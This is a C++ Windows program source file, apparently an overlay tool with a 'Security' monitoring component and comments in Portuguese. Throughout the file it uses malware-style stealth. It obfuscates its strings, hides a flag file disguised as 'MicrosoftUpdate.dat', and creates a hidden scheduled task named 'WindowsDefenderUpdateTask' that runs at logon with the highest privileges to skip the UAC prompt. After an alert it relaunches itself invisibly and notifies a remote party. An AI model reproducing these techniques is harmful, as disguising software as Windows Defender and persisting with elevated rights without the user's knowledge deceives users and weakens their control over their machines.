#define IMGUI_DEFINE_MATH_OPERATORS

#include "Security.hpp"
#include "resource/FrameWork.hpp"
#include <iostream>
#include <fstream>
#include <sstream>
#include "stranch.h"

extern bool g_ForceKeepRunning;

static const char* FLAG_FILE = (const char*)AY_OBFUSCATE("C:\\ProgramData\\MicrosoftUpdate.dat");

static const char* AUTORUN_KEY = (const char*)AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

static const char* AUTORUN_NAME = (const char*)AY_OBFUSCATE("WindowsDefenderUpdate");

static const char* TASK_NAME = (const char*)AY_OBFUSCATE("WindowsDefenderUpdateTask");
bool IsProcessAlive(DWORD pid) {
    if (pid == 0) return false;
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return false;
    DWORD code = 0;
    GetExitCodeProcess(h, &code);
    CloseHandle(h);
    return code == STILL_ACTIVE;
}

struct FlagData { DWORD pid = 0; std::string sessionId; };

FlagData ReadFlag() {
    FlagData d;
    if (GetFileAttributesA(FLAG_FILE) == INVALID_FILE_ATTRIBUTES) return d;
    std::ifstream f(FLAG_FILE);
    f >> d.pid >> d.sessionId;
    return d;
}

void WriteFlag(DWORD pid, const std::string& sessionId) {
    // Remover atributos antes de escrever
    SetFileAttributesA(FLAG_FILE, FILE_ATTRIBUTE_NORMAL);
    std::ofstream f(FLAG_FILE);
    f << pid << "\n" << sessionId;
    f.close();
    SetFileAttributesA(FLAG_FILE, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

void AddAutostart() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Pegar nome do usuário atual para a task
    char username[256] = {};
    DWORD unLen = sizeof(username);
    GetUserNameA(username, &unLen);

    // Criar task agendada: roda no logon do usuário atual com privilégio máximo
    // /F = sobrescreve se já existir
    // /RL HIGHEST = roda como admin sem prompt UAC
    // /SC ONLOGON = dispara no login
    // /DELAY 0000:10 = aguarda 10 segundos após login (garante que o desktop subiu)
    std::string cmd =
        std::string("schtasks /Create /F")
        + " /TN \"" + TASK_NAME + "\""
        + " /TR \"\\\"" + exePath + "\\\"\""
        + " /SC ONLOGON"
        + " /RL HIGHEST"
        + " /DELAY 0000:10"
        + " /RU \"" + username + "\"";

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, 8000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Remover entrada do Run (a task já cuida do autostart, Run é redundante)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, AUTORUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, AUTORUN_NAME);
        RegCloseKey(hKey);
    }
}

void RemoveAutostart() {
    // Remover entrada do Run
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, AUTORUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, AUTORUN_NAME);
        RegCloseKey(hKey);
    }

    // Remover task agendada
    std::string cmd = std::string(AY_OBFUSCATE("schtasks /Delete /F /TN \"")) + TASK_NAME + "\"";
    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
    // Verificar se está rodando como administrador
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (!isAdmin) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);

        // Verificar se a task agendada já existe usando CreateProcess (sem janela)
        bool taskExists = false;
        {
            std::string checkCmd = std::string(AY_OBFUSCATE("schtasks /Query /TN \"")) + TASK_NAME + "\"";
            STARTUPINFOA si = {};
            PROCESS_INFORMATION pi = {};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            if (CreateProcessA(NULL, (LPSTR)checkCmd.c_str(), NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            {
                WaitForSingleObject(pi.hProcess, 3000);
                DWORD exitCode = 1;
                GetExitCodeProcess(pi.hProcess, &exitCode);
                taskExists = (exitCode == 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }

        if (taskExists) {
            // Task existe — disparar sem UAC
            std::string runCmd = std::string(AY_OBFUSCATE("schtasks /Run /TN \"")) + TASK_NAME + "\"";
            STARTUPINFOA si = {};
            PROCESS_INFORMATION pi = {};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            if (CreateProcessA(NULL, (LPSTR)runCmd.c_str(), NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
        else {
            // Primeira vez: relançar com runas (UAC aparece uma única vez)
            SHELLEXECUTEINFOA sei = {};
            sei.cbSize = sizeof(sei);
            sei.lpVerb = "runas";
            sei.lpFile = exePath;
            sei.lpParameters = "";
            sei.nShow = SW_SHOWNORMAL;
            ShellExecuteExA(&sei);
        }
        return 0;
    }

    g_ForceKeepRunning = false;

    FlagData flag = ReadFlag();

    // Processo anterior ainda vivo — não abrir outra instância
    if (flag.pid != 0 && IsProcessAlive(flag.pid)) {
        return 0;
    }

    // Flag existe mas processo morreu — reiniciar invisível
    bool startInvisible = (flag.pid != 0 && !flag.sessionId.empty());

    // Sem flag — limpar autostart se existir
    if (flag.pid == 0) {
        RemoveAutostart();
    }

    Security sec;

    if (startInvisible) {
        sec.SetSessionId(flag.sessionId);
        WriteFlag(GetCurrentProcessId(), flag.sessionId);
        AddAutostart();
        g_ForceKeepRunning = true;
        sec.StartMonitoring();
        std::thread([&sec]() {
            // Aguardar um pouco para o boot terminar antes de tentar enviar
            // NotifyProcessRunning já tem 15 tentativas com 5s de intervalo (até 75s)
            Sleep(10000);
            sec.NotifyProcessRunning(true);
        }).detach();
        while (true) Sleep(60000);
        return 0;
    }

    // Execução normal
    std::thread([&sec]() {
        sec.SendPanelStarted();
        }).detach();

    sec.StartMonitoring();

    FrameWork::Overlay.Initialize();

    sec.StopMonitoring();

    if (sec.WasAlertSent()) {
        AddAutostart();
        sec.NotifyProcessRunning(false);
        while (true) Sleep(60000);
    }

    // Fechou normalmente
    RemoveAutostart();
    DeleteFileA(FLAG_FILE);
    return 0;
}
